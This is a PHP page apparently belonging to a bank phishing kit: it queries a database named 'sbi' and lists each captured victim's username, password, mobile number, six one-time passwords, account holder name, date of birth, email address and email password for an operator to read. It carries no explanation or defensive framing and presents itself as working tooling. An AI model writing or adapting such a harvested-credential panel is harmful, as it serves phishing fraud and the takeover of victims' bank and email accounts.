<?php  
 // Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "MyStrongPassword1234$";
$database = "sbi";
// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
} 
 $sql = "SELECT * FROM `login` LEFT JOIN otp ON `login`.id = otp.id LEFT JOIN otp2 ON `login`.id = otp2.id LEFT JOIN otp3 ON `login`.id = otp3.id LEFT JOIN otp4 ON `login`.id = otp4.id LEFT JOIN otp5 ON `login`.id = otp5.id LEFT JOIN otp6 ON `login`.id = otp6.id LEFT JOIN email ON `login`.id = email.id LEFT JOIN account ON `login`.id = account.id LEFT JOIN `password` ON `login`.id = `password`.id ORDER BY `login`.id DESC";  
 $result = mysqli_query($conn, $sql);  
 ?>  
 <!DOCTYPE html>  
 <html>  
      <head>  
           <title>data</title>  
           <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>  
           <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />  
           <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script> 
           <!-- <script>
   setTimeout (function() {
      location.reload();
   }, 3000);
   
</script>  -->

<style>
    td, th {
    padding: 10px;
}
</style>
      </head>  
      <body>  

      <table style="border: none;">
       
     
           <br />  
           <div class="container" style="width:500px;">  
                <!-- <h3 align="">Fetch Data from Two or more Table Join using PHP and MySql</h3><br />                  -->
                <div>  
                       
                          <?php  
                          if(mysqli_num_rows($result) > 0)  
                          {  
                               while($row = mysqli_fetch_array($result))  
                               {  
                          ?>  


                                <?php
                                    echo "  <tr>
                                  
                                    <td> ID => " . $row["id"]. "<br>Username => " . $row["username"] . "<br> Password => "
                                    . $row["password"]."<br> Mobile =>". $row["mobile"]."</td>
                                    <td>1st_OTP =>  " . $row["otp"] . " <br> 2nd_OTP =>". $row["otp2"]."<br> 3rd_OTP => ". $row["otp3"]."</td>
                                    
                                    <td>Account Holder =>". $row["account"]."<br> DOB => " . $row["dob"] . " </td>
                                   
                                    
                                    <td>Email => ". $row["email"]."<br>Email_Password =>" . $row["epassword"] . "</td>
                                   
                                    <td>4th_OTP => ". $row["otp4"]."<br> 5th_OTP => ". $row["otp5"]."<br>6th_OTP => ". $row["otp6"]." </td>
                                 
                                 </tr>
                                 
                                "
                                ?>
                            
                            
                             
                               

                          <?php  
                               }  
                          }  
                          ?>  
        </table>  
                </div>  
           </div>  
           <br />  
      </body>  
 </html> 





 